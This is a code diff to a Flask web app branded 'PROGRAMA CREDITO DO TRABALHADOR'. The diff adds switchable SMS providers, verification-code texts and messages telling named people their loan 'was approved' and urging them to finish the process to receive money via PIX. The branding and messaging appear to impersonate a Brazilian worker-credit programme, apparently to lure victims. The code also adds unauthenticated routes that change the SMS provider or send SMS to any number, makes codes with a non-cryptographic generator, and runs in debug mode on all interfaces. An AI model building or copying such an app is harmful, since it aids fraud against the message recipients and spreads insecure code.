@@ -1,5 +1,5 @@
 import os
-from flask import Flask, render_template, request, jsonify, redirect, url_for
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session
 import logging
 import secrets
 import qrcode
@@ -23,10 +23,13 @@ app.secret_key = os.environ.get("SESSION_SECRET")
 # Configurar logging
 logging.basicConfig(level=logging.DEBUG)
 
-def send_verification_code(phone_number: str) -> tuple:
+# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
+SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'SMSDEV')
+
+def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
     """
     Sends a verification code via SMS using SMSDEV API
-    Returns a tuple of (success, code or error_message)
+    Returns a tuple of (success, error_message or None)
     """
     try:
         # Get SMS API key from environment variables
@@ -39,9 +42,6 @@ def send_verification_code(phone_number: str) -> tuple:
         formatted_phone = re.sub(r'\D', '', phone_number)
         
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
-            # Generate random 4-digit code
-            verification_code = ''.join(random.choices('0123456789', k=4))
-            
             # Message template
             message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
 
@@ -57,10 +57,10 @@ def send_verification_code(phone_number: str) -> tuple:
             response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
             
             # Log the response
-            app.logger.info(f"SMS verification code sent to {formatted_phone}. Response: {response.text}")
+            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")
             
             if response.status_code == 200:
-                return True, verification_code
+                return True, None
             else:
                 return False, f"API error: {response.text}"
         else:
@@ -68,10 +68,102 @@ def send_verification_code(phone_number: str) -> tuple:
             return False, "Número de telefone inválido"
 
     except Exception as e:
-        app.logger.error(f"Error sending verification SMS: {str(e)}")
+        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
         return False, str(e)
 
-def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
+def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
+    """
+    Sends a verification code via SMS using Owen SMS API
+    Returns a tuple of (success, error_message or None)
+    """
+    try:
+        # Get SMS API token from environment variables
+        sms_token = os.environ.get('SMS_OWEN_TOKEN')
+        if not sms_token:
+            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
+            return False, "API token not configured"
+
+        # Format phone number (remove any non-digits and add Brazil country code)
+        formatted_phone = re.sub(r'\D', '', phone_number)
+        
+        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
+            # Format as international number with Brazil code
+            international_number = f"55{formatted_phone}"
+            
+            # Message template
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
+
+            # API payload
+            payload = {
+                "operator": "claro",  # Default to Claro
+                "destination_number": international_number,
+                "message": message,
+                "tag": "VerificationCode",
+                "user_reply": False,
+                "webhook_url": ""
+            }
+
+            # Headers with Bearer token
+            headers = {
+                "Authorization": f"Bearer {sms_token}",
+                "Content-Type": "application/json"
+            }
+
+            # Make API request
+            response = requests.post('https://api.apisms.me/v2/send.php', 
+                                    json=payload, 
+                                    headers=headers)
+            
+            # Log the response
+            app.logger.info(f"OWEN SMS: Verification code sent to {international_number}. Response: {response.text}")
+            
+            if response.status_code == 200:
+                return True, None
+            else:
+                return False, f"API error: {response.text}"
+        else:
+            app.logger.error(f"Invalid phone number format: {phone_number}")
+            return False, "Número de telefone inválido"
+
+    except Exception as e:
+        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
+        return False, str(e)
+
+def send_verification_code(phone_number: str) -> tuple:
+    """
+    Sends a verification code via the selected SMS API
+    Returns a tuple of (success, code or error_message)
+    """
+    try:
+        # Generate random 4-digit code
+        verification_code = ''.join(random.choices('0123456789', k=4))
+        
+        # Format phone number (remove any non-digits)
+        formatted_phone = re.sub(r'\D', '', phone_number)
+        
+        if len(formatted_phone) != 11:
+            app.logger.error(f"Invalid phone number format: {phone_number}")
+            return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"
+            
+        # Choose which API to use based on SMS_API_CHOICE
+        if SMS_API_CHOICE.upper() == 'OWEN':
+            success, error = send_verification_code_owen(phone_number, verification_code)
+        else:  # Default to SMSDEV
+            success, error = send_verification_code_smsdev(phone_number, verification_code)
+            
+        if success:
+            return True, verification_code
+        else:
+            return False, error
+
+    except Exception as e:
+        app.logger.error(f"Error in send_verification_code: {str(e)}")
+        return False, str(e)
+
+def send_sms_smsdev(phone_number: str, message: str) -> bool:
+    """
+    Send SMS using SMSDEV API
+    """
     try:
         # Get SMS API key from environment variables
         sms_api_key = os.environ.get('SMSDEV_API_KEY')
@@ -79,15 +171,9 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
             app.logger.error("SMSDEV_API_KEY not found in environment variables")
             return False
 
-        # Get first name
-        first_name = full_name.split()[0]
-
         # Format phone number (remove any non-digits and ensure it's in the correct format)
         formatted_phone = re.sub(r'\D', '', phone_number)
         if len(formatted_phone) == 11:  # Include DDD
-            # Message template
-            message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
-
             # API parameters
             params = {
                 'key': sms_api_key,
@@ -99,15 +185,85 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
             # Make API request
             response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
 
-            app.logger.info(f"SMS sent to {formatted_phone}. Response: {response.text}")
+            app.logger.info(f"SMSDEV: SMS sent to {formatted_phone}. Response: {response.text}")
             return response.status_code == 200
-
         else:
             app.logger.error(f"Invalid phone number format: {phone_number}")
             return False
+    except Exception as e:
+        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
+        return False
+
+def send_sms_owen(phone_number: str, message: str) -> bool:
+    """
+    Send SMS using Owen SMS API
+    """
+    try:
+        # Get SMS API token from environment variables
+        sms_token = os.environ.get('SMS_OWEN_TOKEN')
+        if not sms_token:
+            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
+            return False
+
+        # Format phone number (remove any non-digits and add Brazil country code)
+        formatted_phone = re.sub(r'\D', '', phone_number)
+        if len(formatted_phone) == 11:  # Include DDD
+            # Format as international number with Brazil code
+            international_number = f"55{formatted_phone}"
+            
+            # API payload
+            payload = {
+                "operator": "claro",  # Default to Claro
+                "destination_number": international_number,
+                "message": message,
+                "tag": "LoanApproval",
+                "user_reply": False,
+                "webhook_url": ""
+            }
+
+            # Headers with Bearer token
+            headers = {
+                "Authorization": f"Bearer {sms_token}",
+                "Content-Type": "application/json"
+            }
+
+            # Make API request
+            response = requests.post('https://api.apisms.me/v2/send.php', 
+                                   json=payload, 
+                                   headers=headers)
+
+            app.logger.info(f"OWEN SMS: SMS sent to {international_number}. Response: {response.text}")
+            return response.status_code == 200
+        else:
+            app.logger.error(f"Invalid phone number format: {phone_number}")
+            return False
+    except Exception as e:
+        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
+        return False
+
+def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
+    try:
+        # Get first name
+        first_name = full_name.split()[0]
+        
+        # Format phone number (remove any non-digits)
+        formatted_phone = re.sub(r'\D', '', phone_number)
+        
+        if len(formatted_phone) != 11:
+            app.logger.error(f"Invalid phone number format: {phone_number}")
+            return False
+            
+        # Message template
+        message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
+        
+        # Choose which API to use based on SMS_API_CHOICE
+        if SMS_API_CHOICE.upper() == 'OWEN':
+            return send_sms_owen(phone_number, message)
+        else:  # Default to SMSDEV
+            return send_sms_smsdev(phone_number, message)
 
     except Exception as e:
-        app.logger.error(f"Error sending SMS: {str(e)}")
+        app.logger.error(f"Error in send_sms: {str(e)}")
         return False
 
 def generate_random_email(name: str) -> str:
@@ -380,6 +536,83 @@ def atualizar_cadastro():
     except Exception as e:
         app.logger.error(f"[PROD] Erro ao atualizar cadastro: {str(e)}")
         return jsonify({'error': 'Erro ao processar atualização cadastral'}), 500
+
+@app.route('/sms-config')
+def sms_config():
+    try:
+        # Check SMS API key status
+        smsdev_status = bool(os.environ.get('SMSDEV_API_KEY'))
+        owen_status = bool(os.environ.get('SMS_OWEN_TOKEN'))
+        
+        # Get test result from session if available
+        test_result = session.pop('test_result', None)
+        test_success = session.pop('test_success', None)
+        
+        return render_template('sms_config.html',
+                              current_api=SMS_API_CHOICE,
+                              smsdev_status=smsdev_status,
+                              owen_status=owen_status,
+                              test_result=test_result,
+                              test_success=test_success)
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao acessar configuração SMS: {str(e)}")
+        return jsonify({'error': 'Erro interno do servidor'}), 500
+
+@app.route('/update-sms-config', methods=['POST'])
+def update_sms_config():
+    try:
+        sms_api = request.form.get('sms_api', 'SMSDEV')
+        
+        # In a real application, this would be saved to a database
+        # But for this demo, we'll use a global variable
+        global SMS_API_CHOICE
+        SMS_API_CHOICE = sms_api
+        
+        app.logger.info(f"[PROD] API SMS atualizada para: {sms_api}")
+        
+        # We would typically use Flask's flash() here, but for simplicity we'll use a session variable
+        session['test_result'] = f"Configuração atualizada para {sms_api}"
+        session['test_success'] = True
+        
+        return redirect(url_for('sms_config'))
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao atualizar configuração SMS: {str(e)}")
+        session['test_result'] = f"Erro ao atualizar configuração: {str(e)}"
+        session['test_success'] = False
+        return redirect(url_for('sms_config'))
+
+@app.route('/send-test-sms', methods=['POST'])
+def send_test_sms():
+    try:
+        phone = request.form.get('phone', '')
+        
+        if not phone:
+            session['test_result'] = "Por favor, forneça um número de telefone válido"
+            session['test_success'] = False
+            return redirect(url_for('sms_config'))
+        
+        # Message template for test
+        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."
+        
+        # Choose which API to use based on SMS_API_CHOICE
+        if SMS_API_CHOICE.upper() == 'OWEN':
+            success = send_sms_owen(phone, message)
+        else:  # Default to SMSDEV
+            success = send_sms_smsdev(phone, message)
+            
+        if success:
+            session['test_result'] = f"SMS de teste enviado com sucesso para {phone}"
+            session['test_success'] = True
+        else:
+            session['test_result'] = f"Falha ao enviar SMS para {phone}. Verifique o número e tente novamente."
+            session['test_success'] = False
+            
+        return redirect(url_for('sms_config'))
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao enviar SMS de teste: {str(e)}")
+        session['test_result'] = f"Erro ao enviar SMS de teste: {str(e)}"
+        session['test_success'] = False
+        return redirect(url_for('sms_config'))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
